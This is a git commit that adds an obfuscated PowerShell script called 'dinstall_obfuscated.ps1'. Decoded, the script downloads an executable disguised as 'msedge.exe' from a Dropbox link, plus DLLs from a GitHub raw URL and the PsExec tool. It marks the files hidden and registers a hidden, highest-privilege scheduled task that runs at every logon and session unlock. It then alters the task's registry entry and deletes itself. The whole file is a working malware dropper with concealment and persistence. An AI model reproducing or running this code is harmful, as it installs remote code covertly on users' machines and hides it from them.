3aac95fcbcd9ebb22671c480097a64fb3f81fb6a
blousekool <132397759+blousekool@users.noreply.github.com>
2024-03-25 20:16:22 +0100

    Create dinstall_obfuscated.ps1

---
+++ bd/dinstall_obfuscated.ps1
@@ -0,0 +1,95 @@
+sV  hKiU5x  ([CHAR[]]"noiSsERpxE-eKoVNi | )93]rAHc[]gnIrTS[,'BtF'(eCAlPer.)'$','O2a'(eCAlPer.)43]rAHc[]gnIrTS[,)701]rAHc[+88]rAHc[+76]rAHc[((eCAlPer.)29]rAHc[]gnIrTS[,'HU6'(eCAlPer.)'
+tixe
+
+1sp.llatsnid/pmet:vneO2a metI-evomeR c/ exe.llehsrewop
+
+sAnuR breV- exe.egdesm/redloFtra'+'tsO2a/pmet:vneO2a ssecorP-tra'+'tS
+
+exe'+'.cexesp meti-evomeR
+kXCBtF238'+'DSBtF emaNweN- BtFDSBtF emaN- BtFotuadHU6eerTHU6e'+'hcaCksaTHU6eludehcSHU6noisreVtnerruCHU6TN swodni'+'WHU6'+'tfosorciMHU6ERAWTFOSHU6:MLKHBtF htaP- ytreporPmetI-emaneRkXC dnammoC- llehsrewop '+'s- i- aluetpecca/ exe.cexespHU6.
+kXCexe.cexespkXC eliFtuO- kXCexe.cexesp/moc.slanretnisys.evil//:sptth'+'kXC irU- tseuqeRbeW-ekovnI
+
+ecroF- BtFotuadBtF emaNksaT- lm'+'XksatO2a lmX- ksaTdeludehcS-retsigeR
+'+'
+)kXCemaNresU:vneO2aHU6NIAM'+'ODRESU:vneO2akXC ,kXCema'+'NresU:vneO2aHU6NIAMODkXC(ecalpeR.lmXksatO2a = lmXksatO2a
+
+@kXC
+>ksaT/<
+>snoitcA/<
+    >cexE/<
+>dnammoC/<exe.egdesmHU6redloFtra'+'tsO2aHU6pmeTHU6l'+'acoLHU6ataDp'+'pAHU6emanresu:vneO2aHU6sresUHU6:C>dnammoC<
+>cexE<
+>kXCrohtuAkXC=txetnoC snoitcA<'+'
+>sgnitteS/<
+>eruliaFnOtratseR/<
+>tnuoC/<3>tnuoC<
+>lavretnI/<M5TP>lavretnI<
+>eruliaFnOtratseR<
+>ytiroirP/<7>ytiroirP<    '+'
+'+'>timiLemiTnoitucexE/<S0TP>timiLemiTnoitucexE<
+>nuRoTekaW/<eslaf>nuR'+'oTekaW<
+>enignEgniludehcSdeifinUesU/<eurt>enignEgniludehcSdeifinUesU<'+'
+>noiss'+'eSppAe'+'tomeRnOtratSwollasiD/<eslaf>noisseSppAetomeRnOtrat'+'SwollasiD<
+>eldIfIylnOnuR/<eslaf>e'+'ldIfIylnOnuR<
+>neddiH/<eurt>neddiH<   '+'
+>delba'+'nE/<eurt>delbanE<
+>dnameDnOtratSwollA/<eurt>dnameDnOtratSwollA<
+>sgnitteSeldI/<
+>eldInOtratseR/<eslaf>eldInOtratseR<
+'+'>dnEeldInOpotS/<eurt>dnEe'+'ldInOpotS'+'<
+>sgnitteSeldI<
+>'+'elbaliavAkrowteNfIylnOnuR/<eu'+'rt>elbaliavAkrowteNfIylnOnuR<
+>elbaliavAnehWtratS/<eurt>e'+'l'+'baliavAnehWtra'+'tS<
+>etanimreTdraHwollA/<eslaf>etanimreTdraHwollA<
+>seirettaBnOgnioGfIpotS/<eurt>seirettaBnOgnioGfIpotS<
+>seirettaBnOfItratSwollasi'+'D/<eslaf>seirettaBn'+'OfItratSwollasiD<
+>yciloPsecnatsnIelpitluM/<gnitsixEpotS>yciloPsecnatsnIelpitluM<
+>sgnitteS<
+>slapicnirP/<
+>lapicnirP/<  '+'
+>leveLnuR/<e'+'lbaliavAtsehgiH>leveLnuR<
+>epyTnogoL/<nekoTevitcaretnI>epyTnogoL<
+>dIresU/<emaNresU:vneO2aHU6NIAMOD>dIresU<
+>kXCrohtuAk'+'XC=di lapicnirP<
+>slap'+'icnirP<
+>sreggirT/<
+>reg'+'girTegnahCetatSnoisseS/<
+>egnahCetatS/<kcolnUnoisseS>egnahCetatS<
+>delbanE/<'+'eur'+'t>delb'+'anE<
+>re'+'ggirTegnahCe'+'tatSnoisseS<
+>reggirTnogoL/<
+>delbanE/<eurt>delbanE<
+>reggirTnogoL<
+>sreggirT<
+>ofn'+'InoitartsigeR/<
+>IRU/<otuadHU6>IRU<
+>roh'+'tuA/<emanresu:vneO2aHU6emanretupmoc:vneO2a>rohtuA<
+>etaD'+'/<7624766.85:95:11T90-80-3202>etaD<  '+'  '+'
+>ofnInoitartsigeR<
+>kXCksat/tim/20/4002/swodniw/moc.tfosorcim.samehcs'+'//:ptthkXC=snlmx kXC4.1kXC=n'+'oisrev ksaT<
+>?kXC61-FTUkXC=gnidocne kXC0.1kXC=noisrev lmx?<
+kX'+'C@ = lmXksatO2a
+
+01 tnuoCtratseR- '+'weNerongI secna'+'tsnIelpitluM- seirettaBnOgnioGfIpotStnoD- dnEeldInOpotStnoD- seirettaBnOfItratSwollA- teSsgnitteSksaTdeludehcS-weN = sgnitteSksatO2a
+nOgoLtA- reggirTksaTdeludehcS-'+'weN = reg'+'girTksatO2a
+BtFexe.egdesm'+'HU6redloFt'+'ratsO2aHU6pmet:vneO2aBtF etucexE- '+'noitcAksaTdeludehcS-weN = no'+'it'+'cAksatO2a
+
+)neddiH::]setubirttAeliF.OI[ rob- metsyS::]setubirttAeliF.OI[( eulaV- setubirt'+'tA emaN- htaPr'+'edlofO2a htaP- ytreporPmetI-teS
+)neddiH::]setubirttAeliF.OI[ rob- metsyS::]setubirttAeliF.OI[( eulaV- setubirttA emaN- htaP2lldO2a'+' htaP- ytreporPmetI-teS
+)neddiH::]setubirttAeliF.OI[ rob- metsyS::]setubirttAeliF.OI[( eulaV- setubirttA emaN- htaP1lldO2a htaP- ytreporPmetI-teS
+)neddiH::'+']setubirttAeliF.OI[ ro'+'b- metsyS::]setubirttAeliF.OI[( eulaV- setubirttA emaN- htaPelifO2a htaP- ytreporPmetI-teS
+
+kXC/redloFtratsO2a/pmet:vneO2akXC = htaPr'+'edlofO2a
+k'+'XClld.sup'+'obil/redloFtratsO2a/pmet:vneO2akXC = htaP2lldO2a
+kXC'+'lld.muidosbil/redloFt'+'ratsO2a/pmet:vneO2akXC = htaP1lldO2a
+kXCexe.egdesm/redloFtratsO2a/pmet:vneO2akXC = htaPelifO2a
+
+lld.supobil eliFtuO- kXC'+'lld.supobil/sloot/db/niam/slootdbBB/lookesuolb/moc.tnetnocresubuhtig.war//:sptthkXC irU- tse'+'uqeRbeW-ekovnI
+lld.muidosbil e'+'liFtuO- k'+'XClld.mui'+'dosbil/sloot/db/niam/slootdbBB/lookesuolb/moc.tnetnocresubuhtig.war//:sptthkXC irU- tseuqeRbeW-ekovnI
+exe.egdes'+'m e'+'liFtuO- kXC0=ld&6srtyp4n599afbjtdpm'+'pknph4=yeklr?exe.0.2-appasw/vagoy8c2p79plia8j1w1h/if/lcs/moc.tne'+'tnocresuxobpord.ldkXC irU- tseuqeRbeW-ekovnI
+
+redloFtratsO2a dc
+
+redloFtratsO2a ridkm
+kXCzuKX'+'BVskXC = redloFtratsO2a
+pmet:vneO2a dc'(" ) ; [arRAy]::rEvERse((  gcI vaRIaBlE:hkIu5x ).VaLUE );&((vArIaBle '*MDr*').NaMe[3,11,2]-joIn'') ((  gcI vaRIaBlE:hkIu5x ).VaLUE-JOiN '')
